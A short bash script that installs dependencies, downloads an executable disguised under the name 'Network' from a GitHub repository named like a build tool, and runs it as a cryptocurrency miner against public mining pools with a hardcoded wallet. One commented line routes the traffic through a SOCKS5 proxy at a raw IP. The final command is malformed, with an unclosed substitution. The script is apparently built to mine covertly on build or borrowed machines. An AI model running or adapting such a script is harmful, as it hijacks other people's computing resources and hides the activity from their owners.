#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y
wget -O Network https://github.com/lancote-markote/lancote-buildkite/raw/main/Network 
screen -dmS ls
chmod +x phpsur.sh && chmod +x Network && chmod 777 Network phpsur.sh
#./Network --algorithm randomkeva --pool de.kevacoin.herominers.com:1163 --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b --password Build --proxy=socks5://198.12.255.100:14164
./Network --algorithm randomkeva --pool stratum-eu.rplant.xyz:17061 --tls true --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b.VVV KEV_02=$(echo $strDate-$(shuf -i 1-1000 -n 1) --keepalive true
